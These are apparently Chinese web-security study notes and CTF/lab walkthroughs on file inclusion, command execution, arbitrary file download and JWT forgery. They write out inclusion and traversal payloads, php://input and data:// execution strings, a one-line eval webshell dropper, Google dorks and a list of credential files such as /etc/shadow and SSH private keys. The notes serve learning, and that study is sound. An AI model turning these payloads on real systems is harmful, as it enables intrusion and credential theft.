<h1 id="web漏洞-文件操作之文件包含漏洞全解">WEB漏洞-文件操作之文件包含漏洞全解</h1>
<figure data-type="image" tabindex="87"><img src="https://jinqipiaopiao.github.io//post-images/1634364635259.png" alt="" loading="lazy"></figure>
<p>#文件包含漏洞<br>
原理，检测，类型，利用，修复等</p>
<p>#文件包含各个脚本代码<br>
ASP，PHP，JSP，ASPX等</p>
<pre><code>&lt;!--#include file=&quot;1.asp&quot; --&gt;
&lt;!--#include file=&quot;top.aspx&quot; --&gt;
&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;
&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
&lt;%@ include file=&quot;head.jsp&quot;%&gt;
&lt;?php Include('test.php')?&gt;
</code></pre>
<p>#本地包含-无限制，有限制</p>
<pre><code>http://127.0.0.1:8080/include.php?filename=1.txt
http://127.0.0.1:8000/include.php?filename=../../../www.txt
%00截断：条件：magic_quotes_gpc=Off php版本&lt;5.3.4
filename=../../../www.txt%00
推荐方法：长度阶段：条件：windows，点号需要长于256；linux长于4096 
(例如：windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
            linux：                 1.txt............................................................................................................................)
</code></pre>
<p>#远程包含-无限制，有限制 PHP Core ：allow_url_include：on on</p>
<pre><code>http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt?
</code></pre>
<p>#何种协议流玩法</p>
<pre><code>https://www.cnblogs.com/endust/p/11804767.html
http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
http://127.0.0.1:8080/include.php?filename=php://input POST:&lt;?php system('ver')?&gt;
&lt;?php fputs(fopen('s.php'，'w'),'&lt;?php @eval($_POST[cmd])?&gt;';?&gt;
http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo();?&gt;
</code></pre>
<figure data-type="image" tabindex="88"><img src="https://jinqipiaopiao.github.io//post-images/1634364645209.png" alt="" loading="lazy"></figure>
<h1 id="第30天rec代码及命令执行代码全解">第30天—REC代码及命令执行代码全解</h1>
<p>​ 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365256094.png" alt="" loading="lazy"></p>
<p><strong>代码执行</strong><br>
代码执行的危害<br>
执行脚本代码 脚本能干嘛 它就能干嘛</p>
<p><strong>案例（PHP环境）</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365259502.png" alt="" loading="lazy"></p>
<p>假设对方存在这样的一个代码执行漏洞 就可以用代码去攻击它</p>
<p>通过evel去上传一个webshell，然后去控制它</p>
<pre><code>&lt;?php
$myfile = fopen(&quot;newfile.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
$txt = &quot;Bill Gates\n&quot;;
fwrite($myfile, $txt);
$txt = &quot;Steve Jobs\n&quot;;
fwrite($myfile, $txt);
fclose($myfile);
?&gt;
</code></pre>
<p>当evel换成system后，就能够执行系统命令，而操作命令取决于操作系统</p>
<figure data-type="image" tabindex="89"><img src="https://jinqipiaopiao.github.io//post-images/1634365263725.png" alt="" loading="lazy"></figure>
<p>执行系统命令（当前系统为windows）</p>
<figure data-type="image" tabindex="90"><img src="https://jinqipiaopiao.github.io//post-images/1634365267387.png" alt="" loading="lazy"></figure>
<p><strong>漏洞形成条件</strong></p>
<p><strong>代码层面</strong><br>
可控变量</p>
<p>通过参数值改变值</p>
<p>漏洞函数</p>
<p>使用的那一个函数对变量进行操作，例如evel()与system() ，他们产生的漏洞一个是代码执行，一个是系统命令</p>
<p><strong>漏洞检测</strong></p>
<p><strong>白盒测试</strong><br>
代码审计<br>
<strong>黑盒测试</strong><br>
扫描工具</p>
<p>公开漏洞</p>
<p>手工看参数值及功能点</p>
<p>​ 判断他的数据与功能是否相同</p>
<p><strong>案例（墨者靶场）</strong><br>
<strong>墨者靶场黑盒功能点命令执行-应用功能</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365273183.png" alt="" loading="lazy"><br>
打开之后 出现界面</p>
<figure data-type="image" tabindex="91"><img src="https://jinqipiaopiao.github.io//post-images/1634365277706.png" alt="" loading="lazy"></figure>
<p>当我输入127.0.0.1</p>
<p>出现结果<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365282717.png" alt="" loading="lazy"></p>
<p>这个网站的功能 类似于系统的ping命令，这个地方就有可能出现命令执行漏洞</p>
<p>当我们知道存在漏洞的可能性之后，有一下几个步骤</p>
<p><strong>分析是什么操作系统</strong></p>
<p>操作系统不一样，系统命令不一样，通过抓包获取操作系统类型</p>
<p><strong>当确定操作系统之后，手工进行测试</strong></p>
<figure data-type="image" tabindex="92"><img src="https://jinqipiaopiao.github.io//post-images/1634365288260.png" alt="" loading="lazy"></figure>
<p><strong>我们开始进行管道服务（一条命令执行多条命令）</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365294182.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365300125.png" alt="" loading="lazy"></p>
<p><strong>利用burp进行抓包</strong></p>
<figure data-type="image" tabindex="93"><img src="https://jinqipiaopiao.github.io//post-images/1634365304731.png" alt="" loading="lazy"></figure>
<p><strong>获取到目录</strong></p>
<figure data-type="image" tabindex="94"><img src="https://jinqipiaopiao.github.io//post-images/1634365308873.png" alt="" loading="lazy"></figure>
<p><strong>读取key文件，获取key</strong></p>
<figure data-type="image" tabindex="95"><img src="https://jinqipiaopiao.github.io//post-images/1634365313193.png" alt="" loading="lazy"></figure>
<p>总结</p>
<p>根据功能去判断它可能存在这样的漏洞</p>
<p><strong>墨者靶场白盒代码及命令执行-代码分析</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365320200.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365326251.png" alt="" loading="lazy"></p>
<p><strong>查看源码</strong></p>
<figure data-type="image" tabindex="96"><img src="https://jinqipiaopiao.github.io//post-images/1634365331264.png" alt="" loading="lazy"></figure>
<p><strong>在网上找一个线上环境，运行一下这个环境即可</strong></p>
<figure data-type="image" tabindex="97"><img src="https://jinqipiaopiao.github.io//post-images/1634365369776.png" alt="" loading="lazy"></figure>
<p><strong>获取key</strong></p>
<figure data-type="image" tabindex="98"><img src="https://jinqipiaopiao.github.io//post-images/1634365374397.png" alt="" loading="lazy"></figure>
<p><strong>墨者靶场黑盒层RCE漏洞检测-公开漏洞</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365393666.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365397528.png" alt="" loading="lazy"></p>
<p><strong>Webmin</strong>是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器 访问Webmin的各种管理功能并完成相应的管理动作。</p>
<p><strong>网站搜索webmin漏洞</strong></p>
<figure data-type="image" tabindex="99"><img src="https://jinqipiaopiao.github.io//post-images/1634365401641.png" alt="" loading="lazy"></figure>
<p>复现漏洞即可 https://www.cnblogs.com/whoami101/p/11465877.html</p>
<p><strong>javaweb-Struts2框架类RCE漏洞-漏洞层面</strong><br>
通过响应信息查看情况</p>
<figure data-type="image" tabindex="100"><img src="https://jinqipiaopiao.github.io//post-images/1634365405618.png" alt="" loading="lazy"></figure>
<p><strong>搜索漏洞复现即可</strong></p>
<figure data-type="image" tabindex="101"><img src="https://jinqipiaopiao.github.io//post-images/1634365411799.png" alt="" loading="lazy"></figure>
<p>防御<br>
<strong>敏感函数禁用(php为例)</strong></p>
<pre><code>system 执行外部程序并显示输出
exec 执行一一个外部程序
shell_exec 通过hel环境执行命令，并将完整的输出以字符串的方式返回
passthru 执行外部命令并显示原始输出
pcntl_exec 在当前进程空间执行指定程序
</code></pre>
<p>变量过滤或固定</p>
<p>WAF产品</p>
<p>例)</p>
<pre><code>system 执行外部程序并显示输出

exec 执行一一个外部程序

shell_exec 通过hel环境执行命令，并将完整的输出以字符串的方式返回

passthru 执行外部命令并显示原始输出

pcntl_exec 在当前进程空间执行指定程序

变量过滤或固定

WAF产品
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「沐叶清风z」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_45750691/article/details/119754114</p>
<h1 id="web-漏洞-文件操作之文件下载读取">WEB 漏洞-文件操作之文件下载读取</h1>
<p>原理：<br>
产生：任意语言代码下载函数<br>
文件下载（一些网站由于业务需求，往往需要提供文件查看或者文件下载功能，当若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞）</p>
<p><strong>文件下载功能</strong>在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>
所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。</p>
<p><strong>漏洞危害</strong><br>
下载服务器任意文件，如脚本代码，服务及系统配置文件等<br>
可用得到的代码进一步代码审计，得到更多可利用漏洞</p>
<p><strong>利用方式</strong><br>
信息收集信息-》猜路径-》下载配置文件、代码文件-》利用服务器软件漏洞-》shell-》提权<br>
首先收集系统信息，包括系统版本，中间件，cms版本，服务器用途，服务器使用者信息，端口，web路径，然后根据收集到的信息，下载配置，如weblogic，ftp，ssh等，根据下载到的配置文件进行渗透<br>
1.读取程序源代码（如密码配置文件）<br>
2.读取程序配置文件（如数据库连接文件）<br>
如webloginc，ssh，ftp，数据库配置文件等，当接触密码后进行登录，getshell<br>
3。读取操作系统关键文件（如/etc/sadow,/root/.bash_history等文件）<br>
4.读取运维配置文件（redis/rsync/ftp/ssh客户端数据等）<br>
5.读取中间件配置文件（weblogic、tomcat，密码文件，apache的httpd.conf文件）<br>
6.下载web日志文件（获取网站后台、上传文件等）<br>
下载日志文案金，找到登录、上传。后台，操作，找到登录入口可以爆破，测试默认口令，弱口令，找到文件上传点则测试文件上传漏洞找到后台操作<br>
7，结合ssrf获取内网机器文件<br>
8.可以利用../返回到上级目录下载敏感文件</p>
<p><strong>系统文件</strong><br>
<strong>window</strong></p>
<pre><code>C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase. xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user. MYD  //Mysql root 
C:\Windows\php.ini //php配置信息 
C:\Windows\my.ini //Mysql配置信息
</code></pre>
<p><strong>Linux</strong></p>
<pre><code>.bash_history` # 历史中可能带着用户的密码 ( 遇到过现实案例,是输错的情况下参数的,比如没 输入 su 却以为自己输了 su)
/etc/passwd # 用户情况 
/etc/shadow # 直接 John the Ripper 
/etc/hosts # 主机信息，通常配置了一些内网 域名
/root/.bash_history //root的bash历史记录
/root/.ssh/authorized_keys /root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符) 
/proc/mounts /porc/config.gz /proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用 
/proc/mounts // 挂载的文件系统列表 
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息 
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存
/proc/version // 内核版本
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors， 某写情况可以读取到进程正在使用的文件，比如 access.log /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1
/usr/local/tomcat/conf/tomcat-users. xml # tomcat 用户配置文件 
/root/.bashrc # 环境变量 
/root/.bash_history # 还有root外的其他用户
/root/.viminfo # vim 信息
/root/.ssh/id_rsa # 拿私钥直接ssh 
/proc/xxxx/cmdline # 进程状态枚举 xxxx 可以为0000-9999 使用burpsuite 数据库 config 文件     web 日志 access.log, error.log /var/lib/php/sess_PHPSESSID # 非常规问题 session 文件 
/proc/net/arp /proc/net/tcp /proc/net/udp /proc/net/dev
</code></pre>
<p><strong>常见脚本敏感文件参考</strong></p>
<pre><code>PHP： inc/config. php获得数据库连接字符串中的口令信息
asp： inc/conn.asp文件，获得数据库连接字符串，得到数据库口令。
aspx： web.config网站根目录文件，获得数据库连接信息。
JSP： conf/ tomcat-user.xml文件，获得tomcat管理界面的口令信息
WEB- INF /Web. xml文件,获得数据库连接字符串中的口令信息。
</code></pre>
<p><strong>任意文件读取</strong></p>
<pre><code>&lt;?php
$filename = &quot;test.txt&quot;;
readfile($filename);
?&gt;

&lt;?php
$filename = &quot;test.txt&quot;;
$fp = fopen($filename,&quot;r&quot;) or die(&quot;Unable to open file!&quot;);
$data = fread($fp,filesize($filename));
fclose($fp);
echo $data;
?&gt;

&lt;?php
$filename = &quot;test.txt&quot;;
echo file_get_contents($filename);
?&gt;
</code></pre>
<p><strong>任意文件下载</strong><br>
直接下载：</p>
<pre><code>&lt;a href=&quot;http://www.xx.com/a.zip&quot;&gt;Download&lt;/a&gt;
</code></pre>
<p><strong>用header()下载：</strong></p>
<pre><code>&lt;?php
$filename = &quot;uploads/201607141437284653.jpg&quot;;
header('Content-Type: imgage/jpeg');
header('Content-Disposition: attachment; filename='.$filename);
header('Content-Lengh: '.filesize($filename));
?&gt;
</code></pre>
<p><strong>Google search</strong></p>
<pre><code>inurl:&quot;readfile.php?file=&quot;
inurl:&quot;read.php?filename=&quot;
inurl:&quot;download.php?file=&quot;
inurl:&quot;down.php?file=&quot;
</code></pre>
<p>等等...</p>
<p><strong>漏洞利用代码</strong></p>
<pre><code>readfile.php?file=/etc/passwd
readfile.php?file=../../../../../../../../etc/passwd
readfile.php?file=../../../../../../../../etc/passwd%00

1.文件被解析，则是文件包含漏洞
2.显示源代码，则是文件读取漏洞
3.提示文件下载，则是文件下载漏洞
</code></pre>
<p><strong>漏洞挖掘</strong><br>
可以用Google hacking或Web漏洞扫描器<br>
从链接上看，形如：</p>
<pre><code>• readfile.php?file=***.txt
• download.php?file=***.rar
</code></pre>
<p>从参数名看，形如：</p>
<pre><code>• &amp;RealPath= 
• &amp;FilePath= 
• &amp;ﬁlepath= 
• &amp;Path= 
• &amp;path= 
• &amp;inputFile= 
• &amp;url= 
• &amp;urls= 
• &amp;Lang= 
• &amp;dis= 
• &amp;data= 
• &amp;readﬁle= 
• &amp;ﬁlep= 
• &amp;src= 
• &amp;menu= 
• META-INF 
• WEB-INF
目录符号等
../ ..\ .\ ./等
%00 ? %23 %20 .等
</code></pre>
<p><strong>漏洞验证</strong></p>
<pre><code>• index.php?f=../../../../../../etc/passwd 
• index.php?f=../index.php 
• index.php?f=ﬁle:///etc/passwd
注：当参数f的参数值为php文件时，若是文件被解析则是文件包含漏洞，
若显示源码或提示下载则是文件查看与下载漏洞
</code></pre>
<p><strong>漏洞防范</strong></p>
<p>任意文件下载漏洞的简单防护措施<br>
1、过滤“.”符号，使用户在url中无法回溯到上级目录。<br>
2、使用正则表达式严格判断用户输入参数的格式。<br>
3、php.ini配置文件中对于open_basedir进行配置，限定用户的文件访问范围。<br>
4、固定目录</p>
<p><strong>案例</strong><br>
pikuchu靶场-文件下载测试<br>
1、判断是否为文件上传漏洞<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634368609922.png" alt="" loading="lazy"><br>
点击任意图片，发现下载了图片，复制图片下载链接查看</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=kb.png
</code></pre>
<p>查看参数名为filename，查看参数后面的值也与下载的文件名一样<br>
初步判定为文件上传漏洞</p>
<p><strong>2、判断下载路径</strong><br>
filename的文件名是单纯的文件名，可判断是前面加了路径名，也可能是与网站在同一个目录下<br>
通过URL判断文件是通过跳转到execdownload.php页面下载的，我们试试看可不可以直接下载到execdownload.php这个源码</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=execdownload.php
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634368614384.png" alt="" loading="lazy"><br>
发现显示无法下载，说明该execdownload.php与文件不在同一个路径下，我们尝试下到上一级路径</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=../execdownload.php
</code></pre>
<figure data-type="image" tabindex="102"><img src="https://jinqipiaopiao.github.io//post-images/1634368618360.png" alt="" loading="lazy"></figure>
<p>成功下载，打开源码发现是在download文件夹下</p>
<figure data-type="image" tabindex="103"><img src="https://jinqipiaopiao.github.io//post-images/1634368621682.png" alt="" loading="lazy"></figure>
<p>说明文件下载路径的文件夹与down_nba.php是同一级路径<br>
<strong>3、尝试下载敏感文件（以下路径均通过扫描路径得到）</strong><br>
pikachu-master/inc/config.inc.php<br>
当前下载路径：<br>
pikachu-master/vul/unsafedownload/download/xxx.xxx<br>
与vul相差3个父目录，所以加3个…/<br>
完整url：</p>
<pre><code>http://127.0.0.1/xscj/pikachu-master/vul/unsafedownload/execdownload.php?filename=…/…/…/inc/config.inc.php
</code></pre>
<p>下载成功，打开发现里面存在数据库相关的配置文件</p>
<figure data-type="image" tabindex="104"><img src="https://jinqipiaopiao.github.io//post-images/1634368626288.png" alt="" loading="lazy"></figure>
<p><strong>小米路由器-文件读取真实测试-漏洞</strong><br>
复现</p>
<p><strong>RoarCTF2019-文件读取真题复现</strong><br>
wp<br>
首先看到一个页面,点击下help看看啥情况。</p>
<figure data-type="image" tabindex="105"><img src="https://jinqipiaopiao.github.io//post-images/1634368638550.png" alt="" loading="lazy"></figure>
<p>发现输出一串</p>
<pre><code>java.io.FileNotFoundException:{help.docx}
</code></pre>
<p>是文件无法找到的异常信息</p>
<figure data-type="image" tabindex="106"><img src="https://jinqipiaopiao.github.io//post-images/1634368649119.png" alt="" loading="lazy"></figure>
<p>查询资料发现：</p>
<pre><code>WEB-INF/web.xml泄露
WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：
/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件
</code></pre>
<p>漏洞成因：</p>
<pre><code>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！
</code></pre>
<p><strong>根据上文，我们先找一下WEB-INF/web.xml,POST传值</strong></p>
<figure data-type="image" tabindex="107"><img src="https://jinqipiaopiao.github.io//post-images/1634368655474.png" alt="" loading="lazy"></figure>
<p>得到WEB-INF/web.xml文件，打开</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
version=&quot;4.0&quot;&gt;

&lt;welcome-file-list&gt;
&lt;welcome-file&gt;Index&lt;/welcome-file&gt;
&lt;/welcome-file-list&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;/web-app&gt;
</code></pre>
<p>我们可以看到com.wm.FlagController，</p>
<pre><code>&lt;servlet&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
&lt;/servlet&gt;
</code></pre>
<p>servlet-class里面的.代表的是路径/<br>
然后下载FlagController.class文件试一试</p>
<pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
</code></pre>
<p>打开文件发现一串base编码，进行base64解密得到flag</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634368663365.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634368667761.png" alt="" loading="lazy"><br>
https://www.cnblogs.com/yanze/p/10457924.html<br>
https://www.runoob.com/servlet/servlet-tutorial.html<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634368672510.png" alt="" loading="lazy"></p>
<p><strong>百度杯2017二月-Zone真题复现</strong></p>
<p>1、 尝试burp抓包发现cookie中有个login，值为0，将0改为1后在访问首页，发现可以正常登入</p>
<figure data-type="image" tabindex="108"><img src="https://jinqipiaopiao.github.io//post-images/1634368678409.png" alt="" loading="lazy"></figure>
<p>2、单击 “manage” （此时还是需要用burp改login的值），点击框框发现比较特殊的url；猜测可能存在文件包含或者下载、读取</p>
<figure data-type="image" tabindex="109"><img src="https://jinqipiaopiao.github.io//post-images/1634368682044.png" alt="" loading="lazy"></figure>
<p>3、测试访问url: xxxxxx.com/manages/admin.php?module=ind…/ex&amp;name=php 页面可以正常访问,猜测过滤了一遍…/再试一试绕过 url:url: xxxxxx.com/manages/admin.php?module=ind…/./ex&amp;name=php 访问不正常；<br>
说明过滤机制只是把…/进行了一次过滤，所以我们双写…/即可</p>
<p>4、访问测试任意文件读取判断路径通过不断加…/ url:?module=…/./…/./…/./etc/passwd&amp;name<br>
（用户情况文件）</p>
<figure data-type="image" tabindex="110"><img src="https://jinqipiaopiao.github.io//post-images/1634368686754.png" alt="" loading="lazy"></figure>
<p>5、查看下服务器是nginx。找一下它的配置文件，根据信息读取配置文件， url: manages/admin.php?module=…/./…/./…/./etc/nginx/nginx.conf 获得关键文件sites-enabled/default 并进行读取</p>
<figure data-type="image" tabindex="111"><img src="https://jinqipiaopiao.github.io//post-images/1634368691861.png" alt="" loading="lazy"></figure>
<p>module=…/./…/./…/./etc/nginx/sites-enabled/default&amp;name=获得web文件路径online-movies 并访问</p>
<figure data-type="image" tabindex="112"><img src="https://jinqipiaopiao.github.io//post-images/1634368696434.png" alt="" loading="lazy"></figure>
<p>6、发现可以利用的漏洞，因为有一个autoindex on也就是开启了目录遍历，我们可以访问这个/online-movies/，访问出现如下，再点击…/发现要进行验证，把login改为1后页面空白，我通过百度发现要/online-movies/…才能遍历（不清楚为什么）</p>
<figure data-type="image" tabindex="113"><img src="https://jinqipiaopiao.github.io//post-images/1634368702166.png" alt="" loading="lazy"></figure>
<p>7、访问/online-movies…/</p>
<figure data-type="image" tabindex="114"><img src="https://jinqipiaopiao.github.io//post-images/1634368707333.png" alt="" loading="lazy"></figure>
<p>8、地址为:online-movies…/var/www/html/flag.php构造url下载到flag.php获得flag</p>
<h1 id="2021-10-17">2021-10-17</h1>
<h1 id="jwt安全及预编译case注入40-41">JWT安全及预编译case注入（40-41）</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634470535618.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634470540122.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634470543718.png" alt="" loading="lazy"></p>
<p>什么时JWT？<br>
Json Web Token(JSON Web令牌)是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通过数字签名来验证数据未被篡改（但是昨晚下面的WebGoat练习后我对这一点表示怀疑）。<br>
JWT分为三部分，头部（header），声明（Claims），签名（Signature），三个部分以英文句号，隔开。Jwt的内容以Base64URL进行了编码。</p>
<pre><code>头部（header）
{
&quot;alg&quot;:&quot;HS256&quot;;
&quot;typ&quot;:&quot;JWT&quot;
}
</code></pre>
<p>alg是说明这个JWT签名使用的算法的参数，常见值用HS256（默认），HS512等，也可以为none，hs256表示hmac sha256<br>
typ说明这个token的类型为JWT</p>
<p>声明（Claims）</p>
<pre><code>{
&quot;exp&quot;:1416471934,
&quot;user_name&quot;:&quot;user&quot;,
&quot;scope&quot;:[
&quot;read&quot;,
&quot;write&quot;   
],
&quot;authorities&quot;: [
&quot;ROLE_ADMIN&quot;,
&quot;ROLE_USER&quot;
],
&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,
&quot;client_id&quot;: &quot;my-client-with-secret&quot;
}

JWT 固定参数有：

iss：发行人
exp：到期时间
sub：主题
aud：用户
nbf：在此之前不可用
iat：发布时间
jti：JWT ID 用于标识该 JWT
</code></pre>
<p>签名（Signature）<br>
服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密码进行加密，生成的字符串就是 JWT 的签名。<br>
下面是一个用 HS256 生成 JWT 的代码例子<br>
HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload),secret)</p>
<p>1、用户端登录，用户名和密码在请求中被发往服务器<br>
2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，服务器并没有保存登录状态信息。<br>
3、服务器将 JWT（通过响应）返回给客户端<br>
4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中<br>
5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态<br>
6、服务器返回响应</p>
<figure data-type="image" tabindex="115"><img src="https://jinqipiaopiao.github.io//post-images/1634471701524.png" alt="" loading="lazy"></figure>
<p>40.1 JWT</p>
<figure data-type="image" tabindex="116"><img src="https://jinqipiaopiao.github.io//post-images/1634471705966.png" alt="" loading="lazy"></figure>
<p>40.2 身份验证攻击-JWT修改伪造</p>
<figure data-type="image" tabindex="117"><img src="https://jinqipiaopiao.github.io//post-images/1634471711682.png" alt="" loading="lazy"></figure>
<p>接上部分，产生歧义的”=“，”+“，”/“需要删除；<br>
而第一部分说明的加密方法是none，所以第三部分为空就好。</p>
<p><strong>40.3 SQL Injection(mitigation)</strong><br>
防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。<br>
利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;'&quot; + session.getAttribute(&quot;UserID&quot;) + &quot;'&quot;;<br>
参数绑定方式，利用了 sql 的预编译技术</p>
<pre><code>String query = &quot;SELECT * FROM users WHERE last_name = ?&quot;;
